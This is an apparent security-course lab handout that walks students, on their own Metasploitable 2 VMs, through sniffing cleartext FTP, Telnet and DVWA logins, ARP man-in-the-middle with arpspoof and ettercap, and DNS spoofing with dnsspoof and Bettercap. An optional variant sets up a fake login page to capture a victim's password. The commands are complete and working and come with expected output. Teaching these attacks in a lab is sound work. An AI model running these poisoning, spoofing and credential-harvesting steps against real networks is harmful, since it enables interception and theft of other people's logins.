Part 1 — Live cleartext capture on Metasploitable 2 (Do together after Section 1)

Goal. Capture your OWN login to Metasploitable 2 and read the password straight off the wire: start a capture, log in over FTP / Telnet / DVWA from Kali, then carve the cleartext credential in Wireshark.

Step 1 — point at the target and make the capture folder

Do this
export MS2=192.168.56.101     # your real host-only Metasploitable 2 IP
mkdir -p evidence/captures
echo $MS2

What each part of the command means: export MS2=... = remember the target IP so later commands can use $MS2 · mkdir -p evidence/captures = create the folder your .pcap files go in (-p = do not error if it already exists) · echo $MS2 = print it back to confirm it is set.

What you should see
192.168.56.101

The shell prints your Metasploitable 2 IP and returns to the prompt with no error.

What it meansFrom here on, $MS2 points at the target, so every capture and login command hits the right box.

Step 2 — start the capture

Do this
sudo tcpdump -i eth0 -w evidence/captures/ms2-cleartext.pcap host $MS2 and '(tcp port 21 or tcp port 23 or tcp port 80)'

What each part of the command means: sudo = admin rights, needed for raw packet capture · tcpdump = command-line packet sniffer · -i eth0 = capture on this interface (yours may be eth1 — check with ip a) · -w FILE = write raw packets to a .pcap file · host $MS2 = keep only traffic to/from the Metasploitable 2 IP · '(tcp port 21 or 23 or 80)' = FTP, Telnet, and HTTP only. (Prefer a GUI? Open Wireshark, pick the host-only interface, and press the blue shark-fin to start a live capture instead.)

What you should see
tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes

The terminal then sits there, busy, waiting for packets. Leave it running while you do Step 3 in a second terminal.

What it meanstcpdump is now recording every FTP, Telnet, and HTTP packet to and from Metasploitable 2 into a file you can reopen and read later.

Step 3 — generate a cleartext login from Kali

Do this

In a second terminal, log in over FTP (and optionally Telnet), then log in to DVWA in the browser:

ftp $MS2
# Name:     msfadmin
# Password: msfadmin

telnet $MS2        # optional: login msfadmin / msfadmin

# then in the Kali browser go to:  http://$MS2/dvwa/
# first time only: click "Create / Reset Database" on the setup page,
# then log in with  admin / password

What each part of the command means: ftp $MS2 = open an FTP session to Metasploitable 2 · msfadmin / msfadmin = the stock Metasploitable 2 login · telnet $MS2 = open a remote-shell session with no encryption · http://$MS2/dvwa/ = DVWA on the target; admin / password is its default login after you create the database.

What you should see
Connected to 192.168.56.101.
220 (vsFTPd 2.3.4)
Name (192.168.56.101:kali): msfadmin
331 Please specify the password.
Password:
230 Login successful.
ftp>

Telnet ends at a msfadmin@metasploitable:~$ shell prompt. DVWA shows its welcome page after admin / password.

What it meansYou just sent your username and password across the wire in plain text — which is exactly what the capture in Step 2 is recording.

Step 4 — stop the capture and read the password in Wireshark

Do this

Back in the first terminal press Ctrl+C to stop tcpdump, then open the file and filter:

  (Ctrl+C)
wireshark evidence/captures/ms2-cleartext.pcap &
# in the filter bar type:   ftp.request.command == "PASS"
# (or for DVWA:)            http.request.method == "POST"
# right-click the matching packet -> Follow -> TCP Stream

What each part of the command means: Ctrl+C = stop the sniffer · ftp.request.command == "PASS" = a display filter that keeps only the packet carrying the FTP password · http.request.method == "POST" = keeps the DVWA login form submission · Follow -> TCP Stream = reassemble the whole conversation so you can read it top to bottom.

What you should see

tcpdump prints how many packets it saved, then Wireshark shows the request lines in the clear:

^C
47 packets captured
...
Request: USER msfadmin
Request: PASS msfadmin

Follow → TCP Stream shows the whole login, including PASS msfadmin, as readable text. For DVWA the POST body contains username=admin&password=password.

What it meansThe password is sitting there readable — no cracking needed. The service never encrypted it, so anyone on the path can lift it.

Step 5 — record the credential as evidence

Do this

Open lab-assets/templates/credentials-table.md and fill row 1 (account, secret, protocol/path, filter used).

Optional, same answer from the command line:

tshark -r evidence/captures/ms2-cleartext.pcap -Y 'ftp.request.command == "PASS"' -T fields -e ftp.request.arg

What each part of the command means: tshark = command-line Wireshark · -r FILE = read a saved capture · -Y '...' = display filter (only the PASS packet) · -T fields -e ftp.request.arg = print just one field — the password argument.

What you should see
msfadmin

And in your table, row 1 now reads something like: msfadmin / msfadmin · FTP port 21 · filter ftp.request.command == "PASS".

What it meansThis is your first piece of Assignment 2 evidence: a real credential you captured yourself, with the exact filter that proves where it came from.
Checkpoint. Why is a cleartext FTP/HTTP login readable straight off the wire, and what would SSH (Secure Shell) or HTTPS (HTTP over TLS) have changed?
Show solution — what to look for

Expected LIVE Metasploitable 2 output (exact bytes vary by run): FTP shows USER msfadmin then PASS msfadmin in cleartext; DVWA shows an HTTP POST whose body contains username= and password=. Nothing is decrypted — the service never encrypted it.

Why not protected: FTP, Telnet, and plain HTTP carry credentials with no transport encryption. SSH/SFTP or HTTPS would wrap the exchange so a sniffer sees only ciphertext and metadata.

Fallback (no VM — e.g. Apple silicon)Open lab-assets/pcaps/cybercorp-http-login.pcap (HTTP Basic) or cybercorp-ftp-telnet.pcap and carve with http.authorization / ftp.request.command == "PASS". The HTTP Basic blob cHJhbWFuOlNwcmluZzIwMjYh decodes to a username:password pair: 
python3 -c "import base64; print(base64.b64decode('cHJhbWFuOlNwcmluZzIwMjYh').decode())"

Part 2 — Live ARP man-in-the-middle against Metasploitable 2 (Do together after Section 2)

Goal. Become the man-in-the-middle (MITM) between a Victim PC and Metasploitable 2 using Address Resolution Protocol (ARP) spoofing, then capture and read the victim's cleartext login as it passes through Kali. This needs a Victim PC VM; with only Kali + Metasploitable 2 it is an instructor demo — students watch, then analyse the capture.

Step 1 — set both targets

Do this
export MS2=192.168.56.101      # Metasploitable 2 (the target server)
export VICTIM=192.168.56.102   # the Victim PC VM that will log in
echo $MS2 $VICTIM

What each part of the command means: MS2 = the server the victim talks to · VICTIM = the host whose traffic you will steal · echo = confirm both are set.

What you should see
192.168.56.101 192.168.56.102

Both IPs print; no error.

What it meansYou now have both ends of the conversation you are about to sit in the middle of.

Step 2 — turn on forwarding, then poison both directions

Do this
sudo sysctl -w net.ipv4.ip_forward=1
# terminal 1 — tell the victim that you are MS2:
sudo arpspoof -i eth0 -t $VICTIM $MS2
# terminal 2 — tell MS2 that you are the victim:
sudo arpspoof -i eth0 -t $MS2 $VICTIM
# (one-command alternative:)
sudo ettercap -T -q -M arp:remote /$VICTIM// /$MS2//

What each part of the command means: sysctl -w net.ipv4.ip_forward=1 = forward packets not addressed to us, so the relay is silent instead of a black hole · arpspoof = forge ARP replies · -i eth0 = send them out this interface · -t $VICTIM = the host whose cache you poison · $MS2 = the IP you impersonate (run the reverse pair for the other direction) · ettercap -T -q -M arp:remote /$VICTIM// /$MS2// = one-command MITM: text UI, quiet, ARP mode, between the two targets.

What you should see

Each arpspoof window streams one line per forged reply:

0:c:29:9a:1b:2c 0:c:29:7d:8e:9f 0806 42: arp reply 192.168.56.101 is-at 0:c:29:9a:1b:2c
0:c:29:9a:1b:2c 0:c:29:7d:8e:9f 0806 42: arp reply 192.168.56.101 is-at 0:c:29:9a:1b:2c

(The is-at MAC is your Kali's MAC.)

What it meansThe victim and Metasploitable 2 now believe your Kali is the other party, so their traffic detours through you — and IP forwarding keeps their session working so nobody notices.

Step 3 — capture while the victim logs in

Do this
sudo tcpdump -i eth0 -w evidence/captures/ms2-mitm.pcap

Now have the Victim PC browse http://$MS2/dvwa/ or run ftp $MS2 and log in.

What each part of the command means: tcpdump -i eth0 -w ms2-mitm.pcap = record everything crossing Kali (no port filter, because the relayed traffic is what you want) to a .pcap.

What you should see

tcpdump reports listening on eth0 and the packet counter climbs as the victim's login flows through you.

What it meansBecause you are on the path now, the victim's packets physically pass through Kali and land in your capture file.

Step 4 — confirm the poison, then carve the victim's credential

Do this

Open ms2-mitm.pcap in Wireshark and run two filters:

# proof you were the man-in-the-middle:
arp.opcode == 2
# the victim's credential that flowed through you:
http.request.method == "POST"     (then Follow -> HTTP Stream)
ftp.request.command == "PASS"

What each part of the command means: arp.opcode == 2 = keep only ARP replies (the "is-at" packets); the unsolicited ones carry YOUR MAC · http.request.method == "POST" / ftp.request.command == "PASS" = the victim's login as it passed through Kali.

What you should see

The ARP filter shows repeated is-at replies claiming $MS2 is at your Kali MAC (Wireshark often flags "duplicate use ... detected"). The credential filters show the victim's DVWA POST body (username=...&password=...) or FTP PASS ... in cleartext.

What it meansThe ARP replies prove you stole the path; the cleartext login proves that once you are on the path, a switch no longer protects the password.

Step 5 — clean up (required)

Do this
  (Ctrl+C in both arpspoof windows)
sudo sysctl -w net.ipv4.ip_forward=0

What each part of the command means: Ctrl+C = stop forging ARP replies · ip_forward=0 = stop relaying. The victim's and MS2's ARP caches heal on their own timeout.

What you should see

The arpspoof windows stop scrolling; the victim's session returns to normal within a minute as caches restore.

What it meansLeaving a poison running would keep breaking the victim's connectivity — always undo an active Layer-2 attack when you are done.
Checkpoint. Why must both sides be poisoned and IP forwarding enabled for a silent full-duplex relay?
Show solution — what to look for

LIVE poison tell: unsolicited ARP is-at replies mapping $MS2 (or the gateway) to your Kali's MAC, repeated every couple of seconds.

LIVE credential: the victim's DVWA POST body (username=/password=) or FTP USER/PASS, in cleartext, because it now flows through Kali. Exact values vary by run.

Why both + forwarding: poison only one side and you see half the conversation; skip IP forwarding and the victim's traffic black-holes at Kali — a loud outage instead of a silent relay.

Fallback (no VM — e.g. Apple silicon)No victim VM? Watch the instructor's 3-VM demo and analyse that capture. No VM at all? Open lab-assets/pcaps/cybercorp-arp-mitm.pcap, filter arp.opcode == 2 (there the attacker MAC is 00:11:22:de:ad:66), then read the POST body.

Part 3 — Live DNS capture + the spoof you would run (Do together after Section 3)

Goal. Capture real Domain Name System (DNS) traffic on the host-only lab and read the query/answer pairs, then walk the commands you would run (on-path) to forge an answer and what a forged reply looks like. Live DNS spoofing is fragile in class, so the sample pcap is a labelled fallback only.

Step 1 — capture live DNS

Do this
sudo tcpdump -i eth0 -w evidence/captures/ms2-dns.pcap 'udp port 53'

What each part of the command means: -i eth0 = the host-only interface · -w FILE = save to a .pcap · 'udp port 53' = capture only DNS (which uses UDP port 53).

What you should see
tcpdump: listening on eth0, link-type EN10MB (Ethernet)

The sniffer waits for DNS packets.

What it meansYou are now recording every name lookup on the host-only network.

Step 2 — generate some name lookups

Do this
dig @<your-host-only-resolver> metasploitable
# or just browse to Metasploitable 2 by name in the Kali browser

What each part of the command means: dig = a DNS lookup tool · @<resolver> = ask this DNS server · metasploitable = the name to look up. Watch who asks and who answers.

What you should see
;; QUESTION SECTION:
;metasploitable.          IN  A
;; ANSWER SECTION:
metasploitable.    0  IN  A  192.168.56.101

A question for a name, then an A-record answer giving its IP.

What it meansThis is the normal DNS pattern: one query, one answer. A spoof works by racing a fake answer in before (or instead of) the real one.

Step 3 — read the query/answer pairs in Wireshark

Do this
  (Ctrl+C)
wireshark evidence/captures/ms2-dns.pcap &
# filter:  dns
# or from the command line:
tshark -r evidence/captures/ms2-dns.pcap -Y dns -T fields -e frame.time_relative -e dns.qry.name -e dns.a -e eth.src

What each part of the command means: -Y dns = keep only DNS packets · -T fields -e ... = print time, the queried name, the answer IP, and the Ethernet source MAC of whoever answered.

What you should see
0.000000   metasploitable
0.004120   metasploitable   192.168.56.101   00:0c:29:aa:bb:cc

The query line has no answer; the response line shows the IP and the MAC of the real resolver.

What it meansSeeing the Ethernet source of each answer is the key: in a spoof a second answer appears for the same name from a different MAC.

Step 4 — the spoof you WOULD run (on-path), and what a forged answer looks like

Do this

Host-only lab only; demo only if stable. These are the commands an on-path attacker runs after they are already MITM (Part 2):

sudo dnsspoof -i eth0 'udp port 53'
# or with Bettercap, while arp.spoof is on:
set dns.spoof.domains *.lab
dns.spoof on

What each part of the command means: dnsspoof -i eth0 'udp port 53' = forge DNS answers for queries it sees on this interface · Bettercap set dns.spoof.domains *.lab = which names to forge · dns.spoof on = start forging (needs arp.spoof on so you are on-path first).

What you should see

In a forge you see two answers for one name. The earlier one is the attacker's:

metasploitable   192.168.56.66    00:0c:29:9a:1b:2c   <- forged, attacker MAC, arrives first
metasploitable   192.168.56.101   00:0c:29:aa:bb:cc   <- real resolver, arrives later

The forged reply's Ethernet source is the attacker's MAC, while its IP header claims to be the resolver.

What it meansMany stub resolvers keep the first valid answer, so arriving first wins — on-path you already saw the query, so you can copy its transaction ID and port and answer instantly.
Variant — full 3-machine DNS spoof (legit site on Metasploitable 2 → forged to attacker). The steps so far forged a name on paper. This optional variant runs it end to end across three machines so you can watch a real site get silently repointed. Roles: Metasploitable 2 ($MS2) hosts the real site — its Apache web server already serves on port 80 at http://$MS2/, so nothing new is installed on Metasploitable 2. Kali is the attacker. The Victim PC ($VICTIM, the third machine) does the browsing. You will stand up an honest name that points at the real site, prove it works, then forge the Domain Name System (DNS) answer so the same web address lands the victim on Kali's fake login page and captures what they type.
Scope. Host-only, or your-own-VMs-only Network Address Translation (NAT) lab only. Never poison a shared or college network — target only the Victim PC virtual machine (VM) you own.

Step V1 — give the lab name a real answer (on Kali)

Do this

Install a tiny DNS (Domain Name System) server on Kali and map a name to Metasploitable 2 so the honest baseline works:

sudo apt install -y dnsmasq
echo "address=/company.lab/$MS2" | sudo tee /etc/dnsmasq.d/lab.conf
sudo systemctl restart dnsmasq

Then point the Victim PC's DNS at Kali's host-only IP address — edit the Victim PC's /etc/resolv.conf so it reads nameserver <kali-ip>.

What each part of the command means: apt install -y dnsmasq = install dnsmasq, a small DNS server (-y = answer yes automatically) · address=/company.lab/$MS2 = a dnsmasq rule: answer every lookup of company.lab with the Metasploitable 2 IP · tee /etc/dnsmasq.d/lab.conf = write that rule to a config file (sudo because it is system-owned) · systemctl restart dnsmasq = reload dnsmasq so the new rule takes effect · nameserver <kali-ip> = tell the Victim PC to ask Kali for every name.

What you should see
dnsmasq.service - dnsmasq - A lightweight DHCP and caching DNS server
     Active: active (running)

dnsmasq restarts with no error and the prompt returns.

What it meansNow company.lab resolves to the real site on Metasploitable 2 — this is the honest baseline, before any attack.

Step V2 — show the honest baseline

Do this

On the Victim PC, open a browser and go to:

http://company.lab

What each part of the command means: http://company.lab = the Victim PC looks up company.lab (Kali's dnsmasq answers with the Metasploitable 2 IP) and loads whatever is served there.

What you should see

The Victim PC loads Metasploitable 2's real web page — the default Metasploitable 2 / Damn Vulnerable Web Application (DVWA) landing page served by its Apache web server.

What it meansBefore any attack, the name points exactly where it should — at the real site on Metasploitable 2.

Step V3 — get on-path to the victim (ARP man-in-the-middle)

Do this

Put Kali between the Victim PC and its DNS resolver using Address Resolution Protocol (ARP) spoofing, so you become the man-in-the-middle (MITM):

sudo sysctl -w net.ipv4.ip_forward=1
# terminal 1 — tell the victim that you are the resolver/gateway:
sudo arpspoof -i eth0 -t $VICTIM <resolver/gateway-ip>
# terminal 2 — tell the resolver/gateway that you are the victim:
sudo arpspoof -i eth0 -t <resolver/gateway-ip> $VICTIM

What each part of the command means: sysctl -w net.ipv4.ip_forward=1 = let Kali forward traffic that is not addressed to it, so the relay is silent instead of a dead end · arpspoof = send forged ARP replies · -i eth0 = send them out this interface · -t $VICTIM = the machine whose ARP cache you poison · <resolver/gateway-ip> = the IP you impersonate (the DNS resolver or gateway the victim uses); run the reverse pair so both directions flow through Kali.

What you should see
0:c:29:9a:1b:2c 0:c:29:7d:8e:9f 0806 42: arp reply <resolver-ip> is-at 0:c:29:9a:1b:2c

Each window streams is-at lines carrying Kali's Media Access Control (MAC) address — the hardware address of Kali's network card.

What it meansThe victim's traffic now flows through Kali, so Kali can see — and answer — its DNS queries.

Step V4 — stand up the fake site on Kali

Do this
mkdir -p /tmp/fake
echo '<h1>CyberCorp Login</h1><form method=post><input name=user><input name=pass type=password><button>Sign in</button></form>' > /tmp/fake/index.html
sudo python3 -m http.server 80 --directory /tmp/fake

What each part of the command means: mkdir -p /tmp/fake = make a folder for the fake page · echo '...' > /tmp/fake/index.html = write a one-page fake CyberCorp login form into it · python3 -m http.server 80 = run a tiny web server on port 80 (sudo because ports below 1024 need admin) · --directory /tmp/fake = serve that folder, so the form is what visitors get.

What you should see
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

The server sits waiting; each visit prints a request line in this terminal.

What it meansKali now has a page to land the victim on, and it will log whatever the victim types into the form.

Step V5 — forge the DNS answer to point company.lab at Kali

Do this
printf '%s\tcompany.lab\n%s\twww.company.lab\n' <kali-ip> <kali-ip> > /tmp/spoof.hosts
sudo dnsspoof -i eth0 -f /tmp/spoof.hosts 'udp port 53'

What each part of the command means: printf ... > /tmp/spoof.hosts = build a hosts file that maps company.lab and www.company.lab to Kali's IP (\t = a tab between IP and name) · dnsspoof -f /tmp/spoof.hosts = -f gives dnsspoof the hosts file of name→IP pairs it should forge · -i eth0 = watch this interface · 'udp port 53' = a Berkeley Packet Filter (BPF) expression telling dnsspoof to only look at DNS traffic (UDP port 53).

What you should see
<victim-ip>.41234 > <resolver-ip>.53: 12345+ A? company.lab
<kali-ip> spoofing company.lab

dnsspoof prints a spoofed answer line for company.lab each time the victim queries it.

What it meansThe victim now resolves company.lab to Kali instead of to Metasploitable 2.

Step V6 — verify, and how it checks out

Do this

On the Victim PC, browse http://company.lab again — the same web address now lands on Kali's fake login page instead of the real site. Capture the proof:

sudo tcpdump -i eth0 -w evidence/captures/ms2-dnsspoof.pcap 'port 53 or port 80'

What each part of the command means: tcpdump -i eth0 = sniff this interface · -w evidence/captures/ms2-dnsspoof.pcap = save raw packets to a .pcap file you can reopen · 'port 53 or port 80' = keep both the DNS answers (port 53) and the web traffic (port 80), so the capture holds the whole story.

What you should see

In the capture: the forged DNS answer for company.lab (its Ethernet source is the attacker's MAC address) arriving first, then the victim's HTTP POST carrying the typed username and password hitting Kali's web server — which also logs that request line in the Step V4 terminal.

What it meansYou proved a name can be silently repointed to attacker infrastructure, and you captured the credentials the victim submitted. The real site on Metasploitable 2 was the honest destination; the forged answer quietly swapped it for yours.
Checkpoint. Why is on-path DNS spoofing easier than Kaminsky's 2008 remote birthday race?
Show solution — what to look for

LIVE capture: normal DNS is a query then an A-record answer; on udp port 53 you should see your lookups and their responses.

Forge tell (LIVE): two answers for one name; the earlier one's Ethernet source is the attacker MAC while the IP source claims to be the resolver.

Why easier: on-path you already see the query (copy the transaction ID and port, then answer first); Kaminsky had to guess that entropy blind, against a remote resolver, under time pressure.

Fallback (no VM — e.g. Apple silicon)Open lab-assets/pcaps/cybercorp-dns-spoof.pcap and compare the forged vs real A record (two answers for one name).

Part 4 — Carve your own capture into evidence (Do together after Section 4)

Goal. Turn YOUR Part 1-2 Metasploitable 2 captures into Assignment 2 evidence: hashed pcap, filled credentials table, incident timeline, and one defense.

Step 1 — hash your captures first
